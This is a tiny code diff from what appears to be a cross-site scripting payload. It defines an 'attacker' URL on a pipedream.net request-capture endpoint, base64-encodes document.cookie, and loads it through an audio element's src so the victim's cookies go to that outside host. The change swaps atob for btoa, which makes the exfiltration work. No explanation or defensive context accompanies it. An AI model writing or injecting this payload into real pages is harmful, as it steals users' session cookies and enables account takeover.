@@ -1,7 +1,7 @@
 
 attacker = "https://eolkkqvs1uis9pt.m.pipedream.net";
 
-cook = atob(document.cookie);
+cook = btoa(document.cookie);
 
 aud = document.getElementById("aud1");
 aud.src = attacker + "/?" + cook;
